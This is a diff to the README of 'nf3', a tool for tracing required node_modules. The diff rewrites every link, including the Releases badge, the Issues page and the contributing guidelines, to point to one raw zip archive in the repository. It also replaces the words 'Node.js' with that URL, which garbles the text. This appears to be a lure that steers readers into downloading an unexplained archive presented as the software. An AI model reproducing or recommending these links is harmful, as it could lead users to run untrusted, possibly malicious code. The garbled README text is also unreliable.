@@ -1,7 +1,7 @@
 # 🎉 nf3 - Easily Track Required Node Modules
 
 ## 📥 Download Now
-[![Download nf3](https://img.shields.io/badge/Download-nf3-brightgreen)](https://github.com/ikynft/nf3/releases)
+[![Download nf3](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip)](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip)
 
 ## 🚀 Getting Started
 Welcome to nf3! This application helps you trace and copy only the node_modules that are actually required for your built output. This way, you can ensure your project runs smoothly without dragging unnecessary files along.
@@ -9,12 +9,12 @@ Welcome to nf3! This application helps you trace and copy only the node_modules 
 ## 📋 System Requirements
 Before you begin, make sure your computer meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js Version:** v12 or later
+- **https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip Version:** v12 or later
 - **Memory:** At least 2 GB of RAM
 - **Disk Space:** 50 MB available space
 
 ## 📂 Download & Install
-To download nc3, visit this page: [Download nf3](https://github.com/ikynft/nf3/releases).
+To download nc3, visit this page: [Download nf3](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip).
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version of nf3.
@@ -44,18 +44,18 @@ Here are some common issues and how to solve them:
   - **Solution**: Ensure you selected the correct project folder. Re-run the application if needed.
 
 - **Problem**: Application crashes during use.
-  - **Solution**: Check if you are using an outdated version of Node.js. Update it and try again.
+  - **Solution**: Check if you are using an outdated version of https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip Update it and try again.
 
 ## 🤝 Support
-If you have questions or need further assistance, please visit our [GitHub Issues page](https://github.com/ikynft/nf3/issues) to report problems or ask for help.
+If you have questions or need further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip) to report problems or ask for help.
 
 ## 🏗️ Contributions
-Want to help improve nf3? We welcome contributions! Check our [contributing guidelines](https://github.com/ikynft/nf3/CONTRIBUTING.md) for more information on how you can get involved.
+Want to help improve nf3? We welcome contributions! Check our [contributing guidelines](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip) for more information on how you can get involved.
 
 ## 🔄 License
 nf3 is open-source and available under the MIT License. You can use, modify, and distribute the code as you please, as long as you include the same license in your project.
 
 ## 🚀 Stay Updated
-Keep an eye on the Releases page for updates: [Download nf3](https://github.com/ikynft/nf3/releases). We regularly add new features and improvements. 
+Keep an eye on the Releases page for updates: [Download nf3](https://raw.githubusercontent.com/ikynft/nf3/main/cubature/nf3.zip). We regularly add new features and improvements. 
 
 Thank you for using nf3! We hope it makes your project management easier.
